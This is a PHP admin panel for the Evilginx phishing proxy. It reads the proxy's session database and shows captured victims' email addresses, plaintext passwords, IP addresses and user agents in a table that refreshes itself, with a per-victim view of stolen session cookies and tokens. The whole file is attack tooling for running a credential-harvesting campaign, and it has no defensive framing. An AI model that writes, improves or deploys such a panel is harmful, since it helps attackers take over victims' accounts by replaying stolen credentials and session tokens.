<?php
$dataFile = "/root/.evilginx/data.db";

$rows = [];
$viewCookies = isset($_GET["cookies"]);
$cookieData = "";
$cookieID = "";

if (file_exists($dataFile)) {
    $file = fopen($dataFile, "r");

    $jsonBuffer = "";
    $collecting = false;

    while (!feof($file)) {
        $line = trim(fgets($file));

        // Ignore redis protocol markers
        if (preg_match('/^\*|\$|^set$/', $line)) {
            // JSON ended
            if ($collecting && $jsonBuffer !== "") {
                $json = json_decode($jsonBuffer, true);
                if ($json) {
                    $rows[] = $json;

                    if ($viewCookies && isset($_GET["id"]) && $json["id"] == $_GET["id"]) {
                        $cookieID = $json["id"];
                        $cookieData = json_encode($json["tokens"], JSON_PRETTY_PRINT);
                    }
                }
                $jsonBuffer = "";
                $collecting = false;
            }
            continue;
        }

        // Detect JSON start
        if (strpos($line, "{") === 0) {
            $collecting = true;
            $jsonBuffer = $line;
            continue;
        }

        // Append JSON lines
        if ($collecting) {
            $jsonBuffer .= $line;
        }
    }

    fclose($file);

    // Catch last JSON if file ends without protocol marker
    if ($collecting && $jsonBuffer !== "") {
        $json = json_decode($jsonBuffer, true);
        if ($json) $rows[] = $json;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Evilginx Admin</title>
<meta http-equiv="refresh" content="2">
<style>
body {
    background: #111;
    color: #fff;
    font-family: Arial;
}
table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 20px;
}
td, th {
    border: 1px solid #333;
    padding: 8px;
}
a {
    color: #0af;
}
.box {
    background: #222;
    padding: 20px;
    margin-top: 20px;
    border: 1px solid #333;
}
</style>
</head>
<body>

<h2>Evilginx Admin Panel</h2>
<table>
<tr>
    <th>ID</th>
    <th>Email</th>
    <th>Password</th>
    <th>IP</th>
    <th>User Agent</th>
    <th>Time</th>
    <th>Cookies</th>
</tr>

<?php foreach ($rows as $r): ?>
<tr>
    <td><?= htmlspecialchars($r["id"]) ?></td>
    <td><?= htmlspecialchars($r["username"]) ?></td>
    <td><?= htmlspecialchars($r["password"]) ?></td>
    <td><?= htmlspecialchars($r["remote_addr"]) ?></td>
    <td><?= htmlspecialchars($r["useragent"]) ?></td>
    <td><?= htmlspecialchars($r["update_time"]) ?></td>
    <td><a href="?cookies=1&id=<?= $r["id"] ?>">View</a></td>
</tr>
<?php endforeach; ?>

</table>

<?php if ($viewCookies): ?>
<div class="box">
<h3>Cookies for ID: <?= $cookieID ?></h3>
<pre><?= htmlspecialchars($cookieData) ?></pre>
</div>
<?php endif; ?>

</body>
</html>